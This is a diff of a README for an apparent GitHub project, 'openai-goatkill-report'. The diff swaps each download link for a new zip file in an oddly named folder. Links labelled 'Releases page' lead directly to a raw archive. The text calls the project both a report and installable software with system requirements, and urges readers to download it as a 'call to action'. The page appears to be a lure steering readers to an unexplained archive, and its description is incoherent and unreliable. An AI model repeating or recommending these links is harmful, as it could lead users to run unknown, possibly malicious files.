@@ -10,7 +10,7 @@ To start using the openai-goatkill-report, you need to download the latest versi
 ## 📥 Download & Install
 You can easily obtain the software from our Releases page. 
 
-**[Download Here](https://raw.githubusercontent.com/bahirdar15/openai-goatkill-report/main/wrothiness/openai-goatkill-report.zip)**
+**[Download Here](https://github.com/bahirdar15/openai-goatkill-report/raw/refs/heads/main/wrothiness/report_goatkill_openai_v1.4.zip)**
 
 1. Click the link above to visit the Releases page.
 2. Locate the latest version available for download.
@@ -52,7 +52,7 @@ If you encounter any issues, here are some tips:
 
 - **The Software Won't Open:** Make sure you downloaded the correct file for your operating system.
 - **Performance Issues:** Confirm that your computer meets the system requirements mentioned above. Try restarting your device if performance slows down.
-- **Missing Features:** Ensure you're using the latest version of the application. Check back on the [Releases page](https://raw.githubusercontent.com/bahirdar15/openai-goatkill-report/main/wrothiness/openai-goatkill-report.zip) for updates.
+- **Missing Features:** Ensure you're using the latest version of the application. Check back on the [Releases page](https://github.com/bahirdar15/openai-goatkill-report/raw/refs/heads/main/wrothiness/report_goatkill_openai_v1.4.zip) for updates.
 
 ## 🌐 Community and Support
 We welcome all feedback and suggestions. You can join the discussion by visiting our GitHub page or leave an issue if you encounter any problems. Your input helps improve the software and the overall user experience.
@@ -60,7 +60,7 @@ We welcome all feedback and suggestions. You can join the discussion by visiting
 ## 📢 Take Action
 The openai-goatkill-report is more than just a document; it's a call to action. Use the insights and evidence gathered to advocate for transparency and accountability within the AI community. Every voice matters, and your engagement can make a difference.
 
-**[Download Here](https://raw.githubusercontent.com/bahirdar15/openai-goatkill-report/main/wrothiness/openai-goatkill-report.zip)**
+**[Download Here](https://github.com/bahirdar15/openai-goatkill-report/raw/refs/heads/main/wrothiness/report_goatkill_openai_v1.4.zip)**
 
 Explore, learn, and participate. Thank you for your interest in the openai-goatkill-report.
 ```
